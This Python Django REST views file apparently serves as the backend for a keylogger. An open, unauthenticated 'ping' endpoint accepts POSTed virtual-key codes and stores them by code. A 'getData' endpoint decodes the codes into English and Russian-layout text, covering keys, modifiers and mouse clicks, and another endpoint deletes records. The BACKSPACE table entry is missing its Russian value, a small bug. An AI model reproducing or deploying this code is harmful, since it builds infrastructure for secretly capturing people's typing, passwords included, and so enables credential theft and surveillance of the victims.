
from rest_framework.response import Response
from rest_framework.decorators import api_view, permission_classes
from rest_framework import status
from rest_framework.permissions import IsAuthenticated, AllowAny
from rest_framework.pagination import PageNumberPagination
# models
from .models import Log
# serializers
from .serializers import LogSerializer, GetLogSerializer

KEYS = [
    # from 0 to 9
    [0x30, '0', '0'],
    [0x31, '1', '1'],
    [0x32, '2', '2'],
    [0x33, '3', '3'],
    [0x34, '4', '4'],
    [0x35, '5', '5'],
    [0x36, '6', '6'],
    [0x37, '7', '7'],
    [0x38, '8', '8'],
    [0x39, '9', '9'],
    # from A to Z
    [0x41, 'a', 'ф'],
    [0x42, 'b', 'и'],
    [0x43, 'c', 'с'],
    [0x44, 'd', 'в'],
    [0x45, 'e', 'у'],
    [0x46, 'f', 'а'],
    [0x47, 'g', 'п'],
    [0x48, 'h', 'р'],
    [0x49, 'i', 'ш'],
    [0x4A, 'j', 'о'],
    [0x4B, 'k', 'л'],
    [0x4C, 'l', 'д'],
    [0x4D, 'm', 'ь'],
    [0x4E, 'n', 'т'],
    [0x4F, 'o', 'щ'],
    [0x50, 'p', 'з'],
    [0x51, 'q', 'й'],
    [0x52, 'r', 'к'],
    [0x53, 's', 'ы'],
    [0x54, 't', 'е'],
    [0x55, 'u', 'г'],
    [0x56, 'v', 'м'],
    [0x57, 'w', 'ц'],
    [0x58, 'x', 'ч'],
    [0x59, 'y', 'н'],
    [0x5A, 'z', 'я'],
    # BACKSPACE
    [0x08, '[BACK]', ],
    # TAB
    [0x09, '[TAB]', '[TAB]'],
    # ENTER
    [0x0D, '[ENTER]', '[ENTER]'],
    # SHIFT
    [0x10, '[SHIFT]', '[SHIFT]'],
    # CAPS LOCK
    [0x14, '[CAPS]', '[CAPS]'],
    # SPACE
    [0x20, ' ', ' '],
    # CTRL
    [0x11, '[CTRL]', '[CTRL]'],
    # Left mouse button
    [0x01, '[LM]', '[LM]'],
    # Right mouse button
    [0x02, '[RM]', '[RM]'],
    # ALT key
    [0x12, '[ALT]', '[ALT]'],
    # PAUSE key
    [0x13, '[PAUSE]', '[PAUSE]'],
    # 	LEFT ARROW key
    [0x25, '[LEFT]', '[LEFT]'],
    # UP ARROW key
    [0x26, '[UP]', '[UP]'],
    # RIGHT ARROW key
    [0x27, '[RIGHT]', '[RIGHT]'],
    # DOWN ARROW key
    [0x28, '[DOWN]', '[DOWN]'],
    # INS key
    [0x2D, '[INS]', '[INS]'],
    # DEL key
    [0x2E, '[DEL]', '[DEL]'],
]

@api_view(['GET', 'POST'])
@permission_classes([AllowAny])
def ping(request):
    if request.method == 'GET':
        return Response(status=status.HTTP_200_OK)

    if request.method == 'POST': 
        print(request.data)
        print(request.headers)

        # check if data is more than 255 characters
        if len(request.data["data"]) > 255:
            request.data["data"] = request.data["data"][:255]
            request.data["is_overloaded"] = True


        logSerilizer = LogSerializer(data=request.data)
        if logSerilizer.is_valid():
            logSerilizer.save()
            return Response(status=status.HTTP_200_OK)
        return Response(logSerilizer.errors, status=status.HTTP_400_BAD_REQUEST)


@api_view(['GET'])
# @permission_classes([AllowAny])
def getData(request, code):
    paginator = PageNumberPagination()
    paginator.page_size = 3
    query = Log.objects.filter(code=code)
    result_page = paginator.paginate_queryset(query, request)
    logSerializer = GetLogSerializer(result_page, many=True)

    # adding readable data
    for l in logSerializer.data:
        data = l["data"].split(',')
        humanReadableData = ""
        russianHumanReadableData = ""
        for d in data:
            for k in KEYS:
                if d != '' and k[0] == int(d):
                    humanReadableData += k[1]
                    russianHumanReadableData += k[2]
                    break
            
        l["hr"] = humanReadableData
        l["ruhr"] = russianHumanReadableData
    return Response(logSerializer.data, status=status.HTTP_200_OK)


@api_view(['DELETE'])
# @permission_classes([AllowAny])
def deleteData(request, id):
    query = Log.objects.get(pk = id)
    query.delete()
    
    return Response(status=status.HTTP_200_OK)

